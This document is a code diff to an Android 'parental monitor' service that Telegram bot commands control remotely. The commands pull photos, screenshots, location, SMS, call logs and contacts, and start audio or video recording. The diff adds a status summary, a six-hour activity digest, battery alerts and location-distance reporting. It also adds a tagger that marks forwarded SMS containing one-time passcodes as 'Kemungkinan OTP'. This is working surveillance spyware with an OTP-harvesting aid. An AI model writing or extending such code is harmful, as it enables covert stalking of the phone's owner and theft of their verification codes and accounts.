@@ -136,11 +136,14 @@ class MonitoringService : Service() {
         private const val HEX_DIGITS = "0123456789abcdef"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
+        private val OTP_CODE_REGEX = Regex("\\b\\d{4,8}\\b")
+        private val OTP_KEYWORDS = arrayOf("otp", "kode", "verifikasi", "verification", "otentikasi", "aktivasi", "konfirmasi", "token", "password", "kata sandi")
+        private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/night")
         private val NO_REPLAY_COMMANDS = setOf("/sms", "/smsconfirm", "/ring", "/record", "/recordvideo", "/lock")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms")
-        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas")
+        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val PING_RATE_WINDOW_MS = 120_000L
@@ -548,6 +551,8 @@ class MonitoringService : Service() {
                     monitorCycleMs = if (!cachedMonitoringPaused) syncIntervalMillis() else 15 * 60_000L
                     if (!cachedMonitoringPaused) {
                         if (checkAndSendNewData()) idleDataCycles = 0 else idleDataCycles = (idleDataCycles + 1).coerceAtMost(100)
+                        try { checkBatteryAlert() } catch (_: Exception) { }
+                        try { maybeSendDigest() } catch (_: Exception) { }
                         try {
                             CrashReporter.flushPending(this@MonitoringService)
                         } catch (_: Exception) {
@@ -694,7 +699,14 @@ class MonitoringService : Service() {
         val body = buildString {
             appendLine("\uD83D\uDEF0 <b>Patrol</b>")
             if (location != null) {
-                appendLine("https://maps.google.com/?q=${location.latitude},${location.longitude}")
+                val prev = lastSentLatLon()
+                val dist = if (prev == null) -1f else distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
+                if (dist >= 0f && dist < 100f) {
+                    appendLine("Location: still near last spot (±${dist.toInt()} m)")
+                } else {
+                    rememberSentLatLon(location.latitude, location.longitude)
+                    appendLine("https://maps.google.com/?q=${location.latitude},${location.longitude}")
+                }
                 appendLine("Accuracy: ${location.accuracy.toInt()} m")
             } else {
                 appendLine("Location: unavailable")
@@ -1245,6 +1257,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
             com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
             com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
+            com.redeye.parentalmonitor.network.BotCommand("ringkas", "Combined status summary"),
             com.redeye.parentalmonitor.network.BotCommand("perms", "Show app permissions"),
             com.redeye.parentalmonitor.network.BotCommand("night", "Night mode: /night on|off"),
             com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
@@ -1441,6 +1454,20 @@ class MonitoringService : Service() {
                 val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
                 sendToTelegram(permInventoryText(permissionRawStates(), notifOn))
             }
+            "/ringkas" -> {
+                val level = batteryLevel()
+                val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
+                val snap = try { preferencesManager.permSnapshot } catch (_: Exception) { -1 }
+                val missing = try { missingPermLabels(permissionMask(permissionRawStates(), notifOn, snap)) } catch (_: Exception) { ArrayList() }
+                sendToTelegram(buildString {
+                    appendLine("🧾 <b>Ringkas</b>")
+                    appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
+                    appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
+                    appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
+                    appendLine("Izin: " + if (missing.isEmpty()) "semua OK ✅" else "hilang: " + missing.joinToString(", "))
+                    appendLine("Sync: tiap ${preferencesManager.syncInterval} mnt" + if (isNightPaused()) " · malam 🌙" else "")
+                })
+            }
             "/lastcalls" -> {
                 val calls = callLogRepository.getAllCalls(5)
                 if (calls.isEmpty()) {
@@ -1550,7 +1577,11 @@ class MonitoringService : Service() {
                     if (location == null) {
                         sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
                     } else {
-                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
+                        val prev = lastSentLatLon()
+                        val dist = if (prev == null) -1f else distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
+                        rememberSentLatLon(location.latitude, location.longitude)
+                        val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
+                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m$near")
                     }
                 }
             }
@@ -2023,6 +2054,7 @@ class MonitoringService : Service() {
                         appendLine("/pause \u003cminutes\u003e - pause photos")
                         appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
+                        appendLine("/ringkas - status+izin+antrean sekaligus")
                         appendLine("/perms - show app permissions")
                         appendLine("/stop - pause monitoring")
                         appendLine("/resume - resume monitoring")
@@ -2638,6 +2670,8 @@ class MonitoringService : Service() {
             
             smsList.forEach { sms ->
                 appendLine("📞 Number: ${Html.escape(sms.address)}")
+                val tag = smsTag(sms.address, sms.body)
+                if (tag.isNotEmpty()) appendLine(tag)
                 val full = Html.escape(sms.body)
                 val body = full.take(safeCut(full, 200))
                 appendLine("📝 Text: $body${if (full.length > body.length) "..." else ""}")
@@ -3176,6 +3210,83 @@ class MonitoringService : Service() {
             preferencesManager.nightMode && isNightTime()
         } catch (_: Exception) {
             false
+        }
+    }
+
+    private fun batteryLevel(): Int {
+        return try {
+            (getSystemService(BATTERY_SERVICE) as? BatteryManager)?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
+        } catch (_: Exception) {
+            -1
+        }
+    }
+
+    private suspend fun checkBatteryAlert() {
+        val level = batteryLevel()
+        if (level < 0 || level >= 15) return
+        val now = System.currentTimeMillis()
+        val last = try { preferencesManager.batteryAlertAt } catch (_: Exception) { 0L }
+        if (now - last < 24 * 60 * 60_000L) return
+        try { preferencesManager.batteryAlertAt = now } catch (_: Exception) { }
+        sendToTelegram("🔋 Baterai perangkat tinggal $level%. Colok charger agar monitoring tak putus.")
+    }
+
+    private suspend fun maybeSendDigest() {
+        val now = System.currentTimeMillis()
+        val last = try { preferencesManager.digestAt } catch (_: Exception) { 0L }
+        if (now - last < 6 * 60 * 60_000L) return
+        try { preferencesManager.digestAt = now } catch (_: Exception) { }
+        val since = now - 6 * 60 * 60_000L
+        val smsCount = try { smsRepository.getRecentSmsSince(since, 200).size } catch (_: Exception) { -1 }
+        val callCount = try { callLogRepository.getCallsSince(since, 200).size } catch (_: Exception) { -1 }
+        val level = batteryLevel()
+        sendToTelegram(buildString {
+            appendLine("📰 <b>Ringkasan 6 jam</b>")
+            appendLine("SMS masuk: ${if (smsCount < 0) "?" else if (smsCount >= 200) "200+" else "$smsCount"}")
+            appendLine("Panggilan: ${if (callCount < 0) "?" else if (callCount >= 200) "200+" else "$callCount"}")
+            appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
+            appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
+        })
+    }
+
+    private fun lastSentLatLon(): Pair<Double, Double>? {
+        return try {
+            val la = preferencesManager.lastLocLatE6
+            val lo = preferencesManager.lastLocLonE6
+            if (la == Long.MIN_VALUE || lo == Long.MIN_VALUE) null else Pair(la / 1_000_000.0, lo / 1_000_000.0)
+        } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun rememberSentLatLon(lat: Double, lon: Double) {
+        try {
+            preferencesManager.lastLocLatE6 = (lat * 1_000_000).toLong()
+            preferencesManager.lastLocLonE6 = (lon * 1_000_000).toLong()
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun distanceMeters(aLat: Double, aLon: Double, bLat: Double, bLon: Double): Float {
+        return try {
+            val out = FloatArray(1)
+            android.location.Location.distanceBetween(aLat, aLon, bLat, bLon, out)
+            out[0]
+        } catch (_: Exception) {
+            Float.MAX_VALUE
+        }
+    }
+
+    private fun smsTag(address: String, body: String): String {
+        return try {
+            val lower = body.lowercase(java.util.Locale.ROOT)
+            val hasCode = OTP_CODE_REGEX.containsMatchIn(body)
+            val digits = address.filter { it.isDigit() }
+            if (hasCode && (digits.isNotEmpty() && digits.length <= 6 || OTP_KEYWORDS.any { lower.contains(it) })) return "🔑 Kemungkinan OTP"
+            if (PROMO_KEYWORDS.any { lower.contains(it) }) return "📢 Kemungkinan promo"
+            ""
+        } catch (_: Exception) {
+            ""
         }
     }
 
